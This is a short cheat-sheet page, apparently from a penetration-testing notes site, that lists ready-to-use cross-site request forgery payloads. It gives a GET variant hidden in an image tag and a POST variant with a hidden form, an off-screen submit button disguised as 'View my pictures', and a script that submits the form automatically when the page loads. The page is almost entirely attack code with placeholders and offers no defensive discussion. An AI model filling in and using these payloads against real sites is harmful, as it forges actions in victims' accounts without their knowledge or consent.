---
title: Vulnerabilities
category: Web Application
order: 2
---

> **CSRF**
GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">

<input type="hidden" name="<paramater>" value="<value>"/>

<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"

       tabindex="-1"/>

</form>

<script>document.getElementById('CSRF').submit();</script>

{% endhighlight %}


